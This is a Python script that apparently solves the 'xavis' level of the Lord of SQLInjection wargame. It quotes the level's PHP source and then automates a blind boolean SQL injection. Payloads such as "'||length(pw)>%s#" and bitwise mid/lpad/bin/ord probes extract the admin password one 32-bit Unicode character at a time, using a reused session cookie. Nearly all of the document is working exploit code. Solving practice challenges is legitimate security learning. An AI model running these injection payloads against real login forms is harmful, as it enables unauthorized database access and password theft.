#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Xavis

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
    '''

    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "'||length(pw)>%s#"
    len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)

    print(len_of_key)

    # Unicode len 32 bit
    unicode_len_bit = 32
    result = ''

    payload = "'||mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1)=1#"
    param = dict(pw=payload)
    result = los.find_pass_over_bits(url, param, len_of_key, 'Hello admin',
                                     cook, unicode_len_bit)

    '''
    for j in range(1, len_of_key * 8 // unicode_len_bit + 1):

        bit = ''

        for i in range(1, unicode_len_bit + 1):
            payload = f"'||mid(lpad(bin(ord(mid(pw,{j},1))),{unicode_len_bit},0),{i},1)=1#"
            param = dict(pw=payload)
            response = los.get_request(url, param, cook)

            if 'Hello admin' in response:
                bit += '1'
            else:
                bit += '0'

        uni_letter = chr(int(bit, 2))
        print(uni_letter)
        result += uni_letter
    '''
    print(result)
    print(len(result.encode('utf-8')))

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Xavis Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
